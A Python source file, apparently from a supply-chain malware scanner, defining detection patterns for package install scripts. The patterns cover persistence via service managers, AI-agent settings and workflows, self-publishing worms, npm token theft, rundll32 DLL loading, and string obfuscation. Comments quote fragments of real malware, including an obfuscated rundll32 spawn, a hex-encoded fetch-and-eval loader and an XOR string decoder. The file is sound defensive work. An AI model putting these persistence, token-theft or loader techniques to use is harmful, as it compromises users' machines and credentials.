_PERSIST_RUNNER_ARG_RE = re.compile(_PERSIST_RUNNER_ARG_SRC)
_SECRETS_DUMP_RE = re.compile(_SECRETS_DUMP_SRC, re.I)
#: Lines naming a persistence target examined for a shell write, per target
_PERSIST_MAX_LINES = 100


def _persist_agent_file(text):
    """The first AI-agent or editor settings file `text` names ('/'-separated:
    '.claude/settings.json'), whole or as a path join's two literals, or None."""
    m = _PERSIST_AGENT_RE.search(text)
    found = (m.start(), m.group().replace("\\", "/")) if m else None
    for k, s in enumerate(_PERSIST_AGENT_SPLIT_RE.finditer(text)):
        if k >= _PERSIST_MAX_LINES or (found is not None and s.start() > found[0]):
            break
        if s.group(2) in _PERSIST_AGENT_PAIRS[s.group(1)]:
            found = (s.start(), f".{s.group(1)}/{s.group(2)}.json")
            break
    return None if found is None else found[1]


def _shell_writes(text, target_re):
    """Is there a shell write (a redirection, tee, cp …) on a line on which
    target_re matches? Each line is searched once, and at most
    _PERSIST_MAX_LINES lines."""
    m, lines = target_re.search(text), 0
    while m is not None and lines < _PERSIST_MAX_LINES:
        start = text.rfind("\n", 0, m.start()) + 1
        end = text.find("\n", m.end())
        end = len(text) if end < 0 else end
        if _PERSIST_SHELL_WRITE_RE.search(text, start, end):
            return True
        lines += 1
        m = target_re.search(text, end)
    return False


def _after_on_line(text, first_re, then_re):
    """Is there a line on which first_re matches and then_re matches after it?
    Each line is read once: its first first_re match, then then_re after it."""
    m = first_re.search(text)
    while m is not None:
        end = text.find("\n", m.end())
        end = len(text) if end < 0 else end
        if then_re.search(text, m.end(), end) is not None:
            return True
        m = first_re.search(text, end)
    return False


def _writes_named(text, target_re):
    """Does `text` name a target (target_re) and write it?"""
    return target_re.search(text) is not None and (
        _PERSIST_WRITE_RE.search(text) is not None or _shell_writes(text, target_re))


def dumps_workflow_secrets(text):
    """Does `text` carry a GitHub Actions workflow that hands every repository
    secret to a job (`${{ toJSON(secrets) }}`) and name the workflows
    directory? The Shai-Hulud worms planted such workflows."""
    return _SECRETS_DUMP_RE.search(text) is not None and _PERSIST_WORKFLOW_RE.search(text) is not None


# The shortcuts of programs on the machine rewritten (0.1.8): python-dateuti's
# setup.py wrote a clipboard-stealing extension to %APPDATA%, then looked
# for every .lnk shortcut, opened each with WScript.Shell's CreateShortcut
# and set its Arguments (`--load-extension=` for Chrome, Edge and Brave).
# Whatever a rewritten shortcut starts, the program the user clicks now
# starts something else. An installer that makes its own shortcut names
# the file; it does not search for .lnk files to change: the reason is a
# shortcut suffix searched for ('.lnk', '*.lnk'), CreateShortcut, and a
# shortcut's Arguments or TargetPath set.
_PERSIST_SHORTCUT_RE = re.compile(r"\bCreateShortcut\b|\.lnk\b")
_SHORTCUT_FOUND_RE = re.compile(r"""['"`]\*?\.lnk['"`]""", re.I)
_SHORTCUT_SET_RE = re.compile(r"\.\s*(?:Arguments|TargetPath)\s*\+?=(?!=)")

# Programs set to start at login or boot (0.1.8). The CanisterWorm releases
# of @emilgroup's packages and others (March 2026) wrote a systemd user unit
# that runs a Python payload and enabled it with `systemctl --user enable`,
# so the payload ran again at every login, long after the install. Malware
# on every platform does the same through the service managers. No package
# needs any of this while it is installed: a daemon's `install-service`
# command and the auto-launch libraries do it when their user or app asks,
# never at install time, and that code is never read by this test. So each
# is a reason of the install-script test, never at import time. Shell rc
# files are left out: installers append PATH lines to them.
#
# Each is a place and a way to fill it, both in the text:
# - systemd: a unit directory named (systemd/user, systemd/system, whole or
#   as a path join's two literals; not /run/systemd/system, which code reads
#   to learn whether systemd is running) and written, with a unit's
#   ExecStart= in the text or the write on a line that names it; or
#   `systemctl enable` (reenable, link; also as an argument list) run;
# - launchd: LaunchAgents or LaunchDaemons named and written, with a plist's
#   keys (RunAtLoad, KeepAlive, ProgramArguments, StartInterval) in the text
#   or the write on a line that names it; or `launchctl load` (bootstrap,
#   enable, submit) run;
# - cron: a crontab installed (piped into `crontab`, `crontab -`, the list
#   form ['crontab', file]) run, python-crontab's CronTab(...) and .write(),
#   or a cron directory (/etc/cron.d, /etc/crontab, /var/spool/cron) written
#   on a line that names it;
# - a Windows Run key (…\CurrentVersion\Run, RunOnce) named with a registry
#   write (reg add, New-ItemProperty, SetValueEx, putValue, REG_SZ,
#   KEY_SET_VALUE …) within _SVC_RUNKEY_SPAN code points of it (a registry
#   library's docstring names a Run key far from its write calls);
# - a scheduled task: `schtasks /create` run, Register-ScheduledTask, or the
#   Task Scheduler's COM object (Schedule.Service) and RegisterTaskDefinition
#   (alone, an AWS ECS action);
# - the Startup folder (Start Menu\Programs\Startup, shell:startup,
#   CSIDL_STARTUP, a path join's 'Programs', 'Startup') named and written,
#   or a shortcut made;
# - an XDG autostart directory (~/.config/autostart, /etc/xdg/autostart)
#   named and written.
# A command is run when the text has an exec call, or when the command's
# tool starts a command (a line, or after ; & | or a parenthesis: a hook
# command or a shell script). A write "on a line that names it" is a write
# call or a shell write (a redirection, cp, tee …) on a line of at most
# _SVC_LINE_MAX characters: a minified bundle's one line is not a statement.
_SVC_SYSTEMD_DIR_SRC = (
    r"""(?<!/run/)systemd[/\\](?:user|system)(?![\w.-])"""
    r"""|["'`]systemd["'`]\s{0,20}[,+/]\s{0,20}["'`](?:user|system)["'`]""")
_SVC_UNIT_SRC = r"""ExecStart\s{0,20}="""
_SVC_SYSTEMCTL_SRC = (
    r"""\bsystemctl(?:[ \t]+-{1,2}[\w-]+)*[ \t]+(?:enable|reenable|link)\b"""
    r"""|["'`]systemctl["'`]\s{0,20},\s{0,20}(?:["'`]-{1,2}[\w-]+["'`]\s{0,20},\s{0,20}){0,4}["'`]"""
    r"""(?:enable|reenable|link)["'`]""")
_SVC_LAUNCHD_DIR_SRC = r"""\bLaunch(?:Agents|Daemons)\b"""
_SVC_PLIST_SRC = r"""\b(?:RunAtLoad|KeepAlive|ProgramArguments|StartInterval)\b"""
_SVC_LAUNCHCTL_SRC = (
    r"""\blaunchctl(?:[ \t]+-{1,2}[\w-]+)*[ \t]+(?:load|bootstrap|enable|submit)\b"""
    r"""|["'`]launchctl["'`]\s{0,20},\s{0,20}(?:["'`]-{1,2}[\w-]+["'`]\s{0,20},\s{0,20}){0,4}["'`]"""
    r"""(?:load|bootstrap|enable|submit)["'`]""")
_SVC_CRONTAB_SRC = (
    r"""\|[ \t]*(?:sudo[ \t]+)?crontab(?:[ \t]+-(?![\w-])|[ \t]*(?![^"'`)\n;&>]))"""
    r"""|\bcrontab[ \t]+(?:-(?![\w-])|["']?(?:[/~$]|\.\.?/))"""
    r"""|["'`]crontab["'`]\s{0,20},\s{0,20}(?!["'`]-[lre]["'`])[\w$"'`]""")
_SVC_PYCRON_SRC = r"""\bCronTab\s{0,20}\("""
_SVC_PYCRON_WRITE_SRC = r"""\.write\s{0,20}\("""
_SVC_CRON_DIR_SRC = (
    r"""/etc/cron\.(?:d|hourly|daily|weekly|monthly)(?![\w.-])|/etc/crontab(?![\w.-])|/var/spool/cron(?![\w.-])""")
_SVC_RUNKEY_SRC = r"""CurrentVersion(?:\\{1,2}|/)Run(?:Once(?:Ex)?|Services(?:Once)?)?(?!\w)"""
_SVC_REG_WRITE_SRC = (
    r"""\breg(?:\.exe)?["'`]?(?:[ \t]+|\s{0,20},\s{0,20}\[?\s{0,20}["'`])add\b|\b(?:New|Set)-ItemProperty\b"""
    r"""|\bSetValueEx\b|\bSetValue\s{0,20}\(|\bputValue\b|\bRegSetValue|\bREG_(?:EXPAND_)?SZ\b"""
    r"""|\bKEY_(?:SET_VALUE|WRITE|ALL_ACCESS)\b""")
_SVC_SCHTASKS_SRC = r"""\bschtasks(?:\.exe)?["'`]?(?:[ \t]+|\s{0,20},\s{0,20}\[?\s{0,20}["'`])[/-]create\b"""
_SVC_TASK_API_SRC = r"""\bRegister-ScheduledTask\b"""
_SVC_TASK_COM_SRC = r"""\bSchedule\.Service\b"""
_SVC_TASK_REGISTER_SRC = r"""\bRegisterTaskDefinition\b"""
_SVC_STARTUP_SRC = (
    r"""Start[ ]?Menu[/\\]{1,2}Programs[/\\]{1,2}Startup(?!\w)|\bshell:(?:common[ ]?)?startup\b"""
    r"""|\bCSIDL_(?:COMMON_)?STARTUP\b|\bSpecialFolder\.(?:Common)?Startup\b|\bwinshell\.startup\s{0,20}\("""
    r"""|["'`]Programs["'`]\s{0,20}[,+/]\s{0,20}["'`]Startup["'`]""")
_SVC_AUTOSTART_SRC = (
    r"""\.config[/\\]autostart(?![\w.-])|/etc/xdg/autostart(?![\w.-])"""
    r"""|["'`]\.config["'`]\s{0,20}[,+/]\s{0,20}["'`]autostart["'`]""")
_SVC_CMD_START_SRC = (
    r"""(?:(?<![^\n])|[;&|(])[ \t]*(?:sudo[ \t]+)?"""
    r"""(?:systemctl|launchctl|crontab|[Ss][Cc][Hh][Tt][Aa][Ss][Kk][Ss](?:\.[Ee][Xx][Ee])?)(?![\w.-])""")
_SVC_SYSTEMD_DIR_RE = re.compile(_SVC_SYSTEMD_DIR_SRC)
_SVC_UNIT_RE = re.compile(_SVC_UNIT_SRC)
_SVC_SYSTEMCTL_RE = re.compile(_SVC_SYSTEMCTL_SRC)
_SVC_LAUNCHD_DIR_RE = re.compile(_SVC_LAUNCHD_DIR_SRC)
_SVC_PLIST_RE = re.compile(_SVC_PLIST_SRC)
_SVC_LAUNCHCTL_RE = re.compile(_SVC_LAUNCHCTL_SRC)
_SVC_CRONTAB_RE = re.compile(_SVC_CRONTAB_SRC)
_SVC_PYCRON_RE = re.compile(_SVC_PYCRON_SRC)
_SVC_PYCRON_WRITE_RE = re.compile(_SVC_PYCRON_WRITE_SRC)
_SVC_CRON_DIR_RE = re.compile(_SVC_CRON_DIR_SRC)
_SVC_RUNKEY_RE = re.compile(_SVC_RUNKEY_SRC, re.I)
_SVC_REG_WRITE_RE = re.compile(_SVC_REG_WRITE_SRC, re.I)
_SVC_SCHTASKS_RE = re.compile(_SVC_SCHTASKS_SRC, re.I)
_SVC_TASK_API_RE = re.compile(_SVC_TASK_API_SRC, re.I)
_SVC_TASK_COM_RE = re.compile(_SVC_TASK_COM_SRC, re.I)
_SVC_TASK_REGISTER_RE = re.compile(_SVC_TASK_REGISTER_SRC)
_SVC_STARTUP_RE = re.compile(_SVC_STARTUP_SRC, re.I)
_SVC_AUTOSTART_RE = re.compile(_SVC_AUTOSTART_SRC)
_SVC_CMD_START_RE = re.compile(_SVC_CMD_START_SRC)
#: The longest line on which a write counts as writing the place it names
_SVC_LINE_MAX = 1000
#: Code points around a Run key searched for a registry write, and the Run keys read
_SVC_RUNKEY_SPAN = 400


def _writes_on_line(text, target_re):
    """Is there a write call or a shell write on a line on which target_re
    matches? Each line is searched once, and at most _PERSIST_MAX_LINES; a
    line longer than _SVC_LINE_MAX (minified code) is not a statement."""
    m, lines = target_re.search(text), 0
    while m is not None and lines < _PERSIST_MAX_LINES:
        start = text.rfind("\n", 0, m.start()) + 1
        end = text.find("\n", m.end())
        end = len(text) if end < 0 else end
        if end - start <= _SVC_LINE_MAX and (_PERSIST_WRITE_RE.search(text, start, end)
                                             or _PERSIST_SHELL_WRITE_RE.search(text, start, end)):
            return True
        lines += 1
        m = target_re.search(text, end)
    return False


def _run_key_written(text):
    """Is a registry write within _SVC_RUNKEY_SPAN code points of a Run key
    `text` names? The first _PERSIST_MAX_LINES Run keys are read."""
    for k, m in enumerate(_SVC_RUNKEY_RE.finditer(text)):
        if k >= _PERSIST_MAX_LINES:
            break
        if _SVC_REG_WRITE_RE.search(text[max(0, m.start() - _SVC_RUNKEY_SPAN):m.end() + _SVC_RUNKEY_SPAN]):
            return True
    return False


def service_reasons(text):
    """The reasons `text` sets a program to start at login or boot (see
    above), in a fixed order: systemd, launchd, cron, a Run key, a
    scheduled task, the Startup folder, XDG autostart."""
    reasons = []
    runs = None

    def run_context():
        nonlocal runs
        if runs is None:
            runs = _EXEC_CALL_RE.search(text) is not None or _SVC_CMD_START_RE.search(text) is not None
        return runs

    writes = _PERSIST_WRITE_RE.search(text) is not None
    if ((_SVC_SYSTEMD_DIR_RE.search(text) is not None
         and ((writes and _SVC_UNIT_RE.search(text) is not None) or _writes_on_line(text, _SVC_SYSTEMD_DIR_RE)))
            or (_SVC_SYSTEMCTL_RE.search(text) is not None and run_context())):
        reasons.append("installs a systemd service")
    if ((_SVC_LAUNCHD_DIR_RE.search(text) is not None
         and ((writes and _SVC_PLIST_RE.search(text) is not None) or _writes_on_line(text, _SVC_LAUNCHD_DIR_RE)))
            or (_SVC_LAUNCHCTL_RE.search(text) is not None and run_context())):
        reasons.append("installs a launchd agent or daemon")
    if ((_SVC_CRONTAB_RE.search(text) is not None and run_context())
            or (_SVC_PYCRON_RE.search(text) is not None and _SVC_PYCRON_WRITE_RE.search(text) is not None)
            or _writes_on_line(text, _SVC_CRON_DIR_RE)):
        reasons.append("adds a cron job")
    if _run_key_written(text):
        reasons.append("adds a program to a Windows Run key")
    if ((_SVC_SCHTASKS_RE.search(text) is not None and run_context()) or _SVC_TASK_API_RE.search(text) is not None
            or (_SVC_TASK_COM_RE.search(text) is not None and _SVC_TASK_REGISTER_RE.search(text) is not None)):
        reasons.append("creates a Windows scheduled task")
    if _SVC_STARTUP_RE.search(text) is not None and (
            writes or _PERSIST_SHORTCUT_RE.search(text) is not None or _shell_writes(text, _SVC_STARTUP_RE)):
        reasons.append("puts a program in the Windows Startup folder")
    if _SVC_AUTOSTART_RE.search(text) is not None and (writes or _shell_writes(text, _SVC_AUTOSTART_RE)):
        reasons.append("adds a desktop autostart entry")
    return reasons


def persistence_reasons(text):
    """The persistence-target reasons of the install-script test (see above):
    what `text` makes an AI agent, an editor, GitHub Actions or the operating
    system run later, and the programs' shortcuts it rewrites. (0.1.7's Bun
    loader rule — Bun fetched from GitHub's releases and an exec call — is
    gone: the file the loader runs with it is followed and read instead,
    spawned_scripts.)"""
    reasons = []
    agent = _persist_agent_file(text)
    if agent is not None and (_PERSIST_WRITE_RE.search(text) is not None or _shell_writes(
            text, _PERSIST_AGENT_RE) or _shell_writes(text, _PERSIST_AGENT_SPLIT_RE)):
        reasons.append(f"writes an AI agent's or editor's auto-run settings ({agent})")
    if dumps_workflow_secrets(text):
        reasons.append("carries a GitHub Actions workflow that dumps every repository secret")
    elif _PERSIST_WORKFLOW_RE.search(text) is not None and (
            _writes_named(text, _PERSIST_WORKFLOW_RE) or "/contents/" in text):
        reasons.append("writes a GitHub Actions workflow")
    install = _PERSIST_EXT_INSTALL_RE.search(text) is not None
    if ((install and (_EXEC_CALL_RE.search(text) is not None
                      or _after_on_line(text, _PERSIST_EXT_CLI_RE, _PERSIST_EXT_INSTALL_RE)))
            or _writes_named(text, _PERSIST_EXT_DIR_RE)):
        reasons.append("installs an editor extension")
    if _PERSIST_RUNNER_RE.search(text) is not None or _after_on_line(
            text, _PERSIST_RUNNER_CONFIG_RE, _PERSIST_RUNNER_ARG_RE):
        reasons.append("registers the machine as a GitHub Actions self-hosted runner")
    if _SHORTCUT_FOUND_RE.search(text) is not None and "CreateShortcut" in text \
            and _SHORTCUT_SET_RE.search(text) is not None:
        reasons.append("rewrites the shortcuts of programs on the machine")
    reasons.extend(service_reasons(text))
    return reasons


# ---------------- Code that publishes packages (SC-SELF-PUBLISH, 0.1.8) ----------------
# The 2025-26 registry floods shipped a script that gives the package it sits
# in a new name — a random one each time — and runs `npm publish` in a loop:
# IndonesianFoods' auto.js, the generated-name "tea" farms, tens of thousands
# of packages from a few accounts (39 of the 0.1.7 benchmark's misses).
# Release tools publish too, but never rename what they publish. So three
# signs in one file are SC-SELF-PUBLISH, CRITICAL wherever the file is: a
# publish command an exec call runs (`npm publish`, pnpm, yarn, bun; or
# `spawn("npm", ["publish"])`), an assignment to an object's `name`, and a
# write to package.json whose arguments name that object — package.json in
# the arguments, or in the _SELF_PUB_SPAN characters before the call
# (Python's `with open("package.json", "w") as f: json.dump(pkg, f)`).
#
# The worms' half belongs to the install-script test: a script an install
# hook runs that publishes a package, or that collects npm access tokens —
# the @emilgroup releases read ~/.npmrc, NPM_TOKEN and `npm config get
# //registry.npmjs.org/:_authToken`, then handed the tokens to a detached
# deploy script. No install script needs either.
_PUBLISH_CMD_SRC = (
    r"""\b(?:exec|execSync|execa|execaSync|execFile|execFileSync|spawn|spawnSync|system|popen|Popen|run|call"""
    r"""|check_call|check_output|getoutput)\s*\(\s*(?:\[\s*)?["'`](?:[^"'`\n]{0,80}?(?:&&|;|\|\|)\s*)?"""
    r"""(?:npx\s+)?(?:npm|pnpm|yarn|bun)(?:\.cmd)?(?:["'`]\s*,\s*(?:\[\s*)?["'`]|\s+)publish\b""")
_NAME_ASSIGN_SRC = r"""(?<![\w$.])([A-Za-z_$][\w$]*)\s*(?:\.\s*name|\[\s*["']name["']\s*\])\s*=(?![=>])"""
_MANIFEST_WRITE_SRC = (
    r"""\b(?:writeFileSync|writeFile|outputJsonSync|outputJson|writeJsonSync|writeJson|outputFileSync"""
    r"""|outputFile|write_text|dump)\s*\(""")
_JS_IDENT_SRC = r"""(?<![\w$.])[A-Za-z_$][\w$]*"""
_NPM_TOKEN_READ_SRC = (
    r"""\bnpm\s+config\s+get\s+[^\n"'`;|&]{0,200}?_auth|\.npmrc\b[\s\S]{0,400}?_authToken"""
    r"""|_authToken[\s\S]{0,400}?\.npmrc\b""")
_PUBLISH_CMD_RE = re.compile(_PUBLISH_CMD_SRC)
_NAME_ASSIGN_RE = re.compile(_NAME_ASSIGN_SRC)
_MANIFEST_WRITE_RE = re.compile(_MANIFEST_WRITE_SRC)
_JS_IDENT_RE = re.compile(_JS_IDENT_SRC)
_NPM_TOKEN_READ_RE = re.compile(_NPM_TOKEN_READ_SRC)
#: Characters of a write call's arguments (and before it) read for package.json and the renamed object
_SELF_PUB_SPAN = 300
#: Name assignments and package.json writes examined per text
_SELF_PUB_MAX = 200


def self_publish_at(text):
    """The offset of the publish command of code that renames its package and
    publishes it (see above), else -1."""
    if "publish" not in text or "package.json" not in text:
        return -1
    pub = _PUBLISH_CMD_RE.search(text)
    if pub is None:
        return -1
    names = set()
    for k, m in enumerate(_NAME_ASSIGN_RE.finditer(text)):
        if k >= _SELF_PUB_MAX:
            break
        names.add(m.group(1))
    if not names:
        return -1
    for k, w in enumerate(_MANIFEST_WRITE_RE.finditer(text)):
        if k >= _SELF_PUB_MAX:
            break
        args = text[w.end():w.end() + _SELF_PUB_SPAN]
        if "package.json" not in args and "package.json" not in text[max(0, w.start() - _SELF_PUB_SPAN):w.start()]:
            continue
        if names.intersection(_JS_IDENT_RE.findall(args)):
            return pub.start()
    return -1


# ---------------- An install script that runs a DLL (0.1.8) ----------------
# eslint-config-prettier 9.1.1 (July 2025) shipped node-gyp.dll and an
# install.js that ran it on Windows: require('chi'+'ld_pro'+'cess')["sp"+
# "awn"]("rund"+"ll32", [path.join(__dirname, './node-gyp' + '.dll') +
# ",main"]). rundll32 and regsvr32 run a DLL's code; an install script has
# no reason to call either on a DLL of its own. The text is read again with
# adjacent string literals joined ('a' + 'b' as 'ab') when the split hid the
# names. Windows' own DLLs that rundll32 is used with for ordinary things
# (opening a URL with url.dll, a Control Panel applet with shell32.dll) are
# not a reason; a DLL of any other name is.
_DLL_LOADER_SRC = r"""\b(?:rundll32|regsvr32)(?:\.exe)?\b"""
_DLL_NAME_SRC = r"""(?<![\w.\-])[\w.\-]*\.dll\b"""
_STRING_JOIN_SRC = r"""["']\s*\+\s*["']"""
_DLL_LOADER_RE = re.compile(_DLL_LOADER_SRC, re.I)
_DLL_NAME_RE = re.compile(_DLL_NAME_SRC, re.I)
_STRING_JOIN_RE = re.compile(_STRING_JOIN_SRC)
_SYSTEM_DLLS = frozenset(("url.dll", "shell32.dll", "user32.dll", "ieframe.dll", "dfshim.dll", "advpack.dll",
                          "printui.dll", "keymgr.dll", "powrprof.dll", "zipfldr.dll", "shdocvw.dll", "shimgvw.dll"))


def join_string_pieces(text):
    """`text` with adjacent string literals joined: `'chi' + 'ld'` reads
    `'child'` (a quote, a plus and a quote taken out)."""
    return _STRING_JOIN_RE.sub("", text) if "+" in text else text


def runs_dll(text):
    """The DLL `text` runs with rundll32 or regsvr32 (a name, not one of
    Windows' own ordinary ones), read as written and with its string pieces
    joined; None when it runs none."""
    if "32" not in text and "+" not in text:
        return None
    for view in (text, join_string_pieces(text)):
        if _DLL_LOADER_RE.search(view) is None:
            continue
        for m in _DLL_NAME_RE.finditer(view):
            name = m.group().rsplit("/", 1)[-1].rsplit("\\", 1)[-1].lower()
            if name and name != ".dll" and name not in _SYSTEM_DLLS:
                return name
    return None


# ---------------- Names in strings a file decodes as it runs (0.1.8) ----------------
# tailwind-book-icon and five more loggers of one campaign kept every name
# their payload needs hex-encoded and decoded them with a helper of their own:
#     function g(h) { return h.replace(/../g, m => String.fromCharCode(parseInt(m, 16))); }
#     let hl = [g('72657175697265'), g('6178696f73'), g('706f7374'), g('6874…'), …];
#     require(hl[1])[[hl[2]]](hl[3], { ...process.env }, …)[[hl[7]]](r => eval(r.data));
# which is axios.post(URL, …).then(r => eval(r.data)) — fetch and run — once
# the strings are read; postman-converters wrote require(Buffer.from("6f73",
# "hex").toString()) for require('os'). The install-script and import-time
# tests read a file a second time the way it reads once its strings are
# decoded (decoded_view): string literals joined across a '+' on one row;
# a decoder's call on a literal replaced by the text it decodes to —
# Buffer.from(…, 'hex' | 'base64').toString(), atob(…), bytes.fromhex(…)
# .decode(), b64decode(…).decode(), unhexlify(…).decode(), and the file's
# own helpers (a function of one parameter whose first _DV_BODY characters
# decode hex, as parseInt(…, 16) with fromCharCode, or base64) — when that
# text is printable ASCII; and, once something was decoded, a constant array
# of string literals read where it is indexed by a number, and a member
# named by a literal read as one (process["env"] as process.env). A reason
# found only there says so. Rows keep their line breaks, so lines are the
# file's. Literals joined and nothing decoded are no second reading: a
# bundle joins literals everywhere, and reading its 3 MB again doubled the
# test's time (playwright-core's coreBundle.js) to find nothing.
_DV_MAX_LITERAL = 400           # characters of an encoded literal, at most
_DV_BODY = 400                  # characters of a helper's body read for what it decodes
_DV_MAX_HELPERS = 8             # decoding helpers of a file, at most
_DV_MAX_ARRAYS = 16             # constant arrays read, at most
_DV_MAX_CHARS = 4_000_000       # a longer text is not read again
_DV_NOTE = " (in strings it decodes as it runs)"
_DV_LIT = r"""(?:'(?P<a>[^'\\\n]{1,400})'|"(?P<b>[^"\\\n]{1,400})"|`(?P<c>[^`\\\n$]{1,400})`)"""
_DV_JOIN_SRC = r"""'[ \t]*\+[ \t]*'|"[ \t]*\+[ \t]*""" + '"'
_DV_BUFFER_SRC = (r"""\bBuffer[ \t]*\.[ \t]*from[ \t]*\([ \t]*""" + _DV_LIT
                  + r"""[ \t]*,[ \t]*['"`](?P<enc>hex|base64)['"`][ \t]*\)[ \t]*\.[ \t]*toString[ \t]*\([ \t]*"""
                  r"""(?:['"`](?:utf-?8|ascii|latin1|binary)['"`])?[ \t]*\)""")
_DV_ATOB_SRC = r"""(?<![\w$.])atob[ \t]*\([ \t]*""" + _DV_LIT + r"""[ \t]*\)"""
_DV_PY_SRC = (r"""\b(?:(?P<fh>bytes[ \t]*\.[ \t]*fromhex)|(?P<uh>(?:binascii[ \t]*\.[ \t]*)?unhexlify)"""
              r"""|(?:base64[ \t]*\.[ \t]*)?b64decode)[ \t]*\([ \t]*b?(?:'(?P<a>[^'\\\n]{1,400})'|"(?P<b>[^"\\\n]{1,400})")"""
              r"""[ \t]*\)[ \t]*\.[ \t]*decode[ \t]*\([^()\n]{0,20}\)""")
_DV_HELPER_SRC = (r"""\bfunction[ \t]+(?P<a>[A-Za-z_$][\w$]*)[ \t]*\([ \t]*[A-Za-z_$][\w$]*[ \t]*\)"""
                  r"""|\b(?:const|let|var)[ \t]+(?P<b>[A-Za-z_$][\w$]*)[ \t]*=[ \t]*(?:function[ \t]*\([ \t]*"""
                  r"""[A-Za-z_$][\w$]*[ \t]*\)|\(?[ \t]*[A-Za-z_$][\w$]*[ \t]*\)?[ \t]*=>)"""
                  r"""|\bdef[ \t]+(?P<c>[A-Za-z_]\w*)[ \t]*\([ \t]*[A-Za-z_]\w*[ \t]*\)[ \t]*:""")
_DV_STR_ITEM_SRC = r"""'[^'\\\n]{0,400}'|"[^"\\\n]{0,400}""" + '"'
_DV_ARRAY_SRC = (r"""(?<![\w$.])(?P<name>[A-Za-z_$][\w$]*)[ \t]*=[ \t]*\[(?P<items>(?:\s*(?:""" + _DV_STR_ITEM_SRC
                 + r""")\s*,){0,63}\s*(?:""" + _DV_STR_ITEM_SRC + r""")\s*,?\s*)\]""")
# a member named with a string literal after a name, a call or an index:
# process["env"] reads process.env (an array literal's ['x'] is not one)
_DV_MEMBER_SRC = r"""(?<=[\w$)\]])\[[ \t]*(?:'(?P<a>[A-Za-z_$][\w$]{0,63})'|"(?P<b>[A-Za-z_$][\w$]{0,63})")[ \t]*\]"""
_DV_MEMBER_RE = re.compile(_DV_MEMBER_SRC)
_DV_HEX_RE = re.compile(r"[0-9A-Fa-f]+")
_DV_B64_RE = re.compile(r"[A-Za-z0-9+/]+={0,2}")
_DV_JOIN_RE = re.compile(_DV_JOIN_SRC)
_DV_BUFFER_RE = re.compile(_DV_BUFFER_SRC)
_DV_ATOB_RE = re.compile(_DV_ATOB_SRC)
_DV_PY_RE = re.compile(_DV_PY_SRC)
_DV_HELPER_RE = re.compile(_DV_HELPER_SRC)
_DV_STR_ITEM_RE = re.compile(_DV_STR_ITEM_SRC)
_DV_ARRAY_RE = re.compile(_DV_ARRAY_SRC)
_DV_NEEDLES = ("Buffer", "atob", "fromhex", "unhexlify", "b64decode", "fromCharCode", "hex", "base64", "chr", "byte")
# (0.1.8) A home-made XOR decoder: react-zutils 1.0.1, which its preinstall
# hook starts detached, kept the 83 strings its browser stealer needs —
# modules, browser paths, SQL, its ngrok address — as base64 of the text
# XORed with a four-letter key, decoded by a helper of its own:
#     n=(t,e)=>{let r=Buffer.from(t,"base64");…a[index]=255&(r[index]^e.charCodeAt(3&index))…},
#     a=t=>n(t,"utf8"), E=a("BgUKUQERVQ")               // "sqlite3"
# The helper's body is not read. In a text with a ^, a name called with one
# literal of base64 (padded, or not) or of hex at least _DV_XOR_MIN_CALLS
# times (its first _DV_XOR_MAX_CALLS calls are tried, holding at least
# _DV_XOR_MIN_BYTES bytes in all) is such a decoder when one string literal
# of the text — of the first _DV_XOR_MAX_KEYS distinct ones of 1 to
# _DV_XOR_KEY_MAX printable ASCII characters — XORed over the bytes, repeated
# from the first, makes all but a tenth of those calls printable ASCII; its
# calls are read as that text. A random key does that to a random call with
# a chance of 95/256 a byte: 32 bytes make a false decoder a chance in 10^13.
_DV_XOR_MIN_CALLS = 5
_DV_XOR_MAX_CALLS = 64
_DV_XOR_MIN_BYTES = 32
_DV_XOR_MAX_KEYS = 256
_DV_XOR_KEY_MAX = 32
_DV_CALL_SRC = r"""(?<![\w$.])(?P<name>[A-Za-z_$][\w$]*)[ \t]*\([ \t]*""" + _DV_LIT + r"""[ \t]*\)"""
_DV_KEY_SRC = r"""'(?P<a>[^'\\\n]{1,32})'|"(?P<b>[^"\\\n]{1,32})"|`(?P<c>[^`\\\n$]{1,32})`"""
_DV_CALL_RE = re.compile(_DV_CALL_SRC)
_DV_KEY_RE = re.compile(_DV_KEY_SRC)
# The patterns decoded_view builds around the names a file uses (each name
# escaped): a call of one of its decoding helpers, and an array read by index
# (not one the file changes, and assigned once).
_DV_NAME_HEAD = r"""(?<![\w$.])"""
_DV_HELPER_CALL_TAIL = r""")[ \t]*\([ \t]*""" + _DV_LIT + r"""[ \t]*\)"""
_DV_MUTATED_TAIL = (r"""\s*(?:\.\s*(?:push|pop|shift|unshift|splice|reverse|sort|fill"""
                    r"""|copyWithin|append|insert|extend|remove)\s*\(|\[[^\]\n]{0,80}\]\s*=(?!=))""")
_DV_ASSIGNED_TAIL = r"\s*=(?![=>])"
_DV_INDEX_TAIL = r"\s*\[\s*([0-9]{1,2})\s*\]"


def _dv_decode(kind, s):
    """The printable ASCII text the literal `s` decodes to as hex or base64
    (strictly: an even run of hex digits; base64 padded to a multiple of 4),
    else None."""
    if kind == "hex":
        if len(s) % 2 or _DV_HEX_RE.fullmatch(s) is None:
            return None
        data = bytes.fromhex(s)
    else:
        if len(s) % 4 or _DV_B64_RE.fullmatch(s) is None:
            return None
        try:
            data = base64.b64decode(s)
        except ValueError:
            return None
    if not data or any(b < 0x20 or b > 0x7e for b in data):
        return None
    return data.decode("ascii")


def _dv_quote(s):
    return "'" + s.replace("\\", "\\\\").replace("'", "\\'") + "'"


def _dv_helpers(text):
    """{name: 'hex' | 'base64'}: the file's own decoding helpers (see above)."""
    out = {}
    for m in _DV_HELPER_RE.finditer(text):
        name = m.group("a") or m.group("b") or m.group("c")
        if name in out:
            continue
        body = text[m.end():m.end() + _DV_BODY]
        if (("fromCharCode" in body and "parseInt" in body and "16" in body) or "'hex'" in body
                or '"hex"' in body or "fromhex(" in body or "unhexlify(" in body):
            out[name] = "hex"
        elif "base64" in body or "atob(" in body or "b64decode(" in body:
            out[name] = "base64"
        else:
            continue
        if len(out) >= _DV_MAX_HELPERS:
            break
    return out


def _dv_literal(m):
    return m.group("a") or m.group("b") or (m.group("c") if "c" in m.re.groupindex else None)


def _dv_bytes(s, kind):
    """The bytes the literal `s` holds as hex (an even run of hex digits) or
    as base64 (padded; or unpadded, but for a length of one more than a
    multiple of 4), else None."""
    if kind == "hex":
        return bytes.fromhex(s) if len(s) % 2 == 0 and _DV_HEX_RE.fullmatch(s) else None
    if _DV_B64_RE.fullmatch(s) is None or len(s) % 4 == 1 or ("=" in s and len(s) % 4):
        return None
    return base64.b64decode(s + "=" * (-len(s) % 4))


def _dv_xor_printable(data, key):
    """Is every byte of `data` XORed with `key` (repeated) printable ASCII?"""
    n = len(key)
